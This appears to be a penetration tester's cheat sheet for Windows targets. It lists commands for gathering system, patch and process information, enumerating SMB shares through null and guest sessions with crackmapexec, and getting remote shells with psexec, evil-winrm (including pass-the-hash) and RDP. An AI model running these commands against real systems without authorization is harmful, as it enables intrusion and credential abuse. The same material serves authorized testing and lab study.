Check OS architecture / version:
```powershell
ver
wmic os get osarchitecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Get routes:
```powershell
route PRINT
```

Get running processes:

```powershell
tasklist /SVC
```

Get installed patches:

```powershell
wmic qfe
```



Add domain NB name to /etc/hosts

```shell
crackmapexec smb $TARGET_IP -u '' -p ''
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M spider_plus --spider users
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

Try to connect to console:

```shell
impacket-psexec $USER@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```

```sh
crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
```


Port 3389 RDP:

```sh
xfreerdp /v:$TARGET_IP /u:$USER
```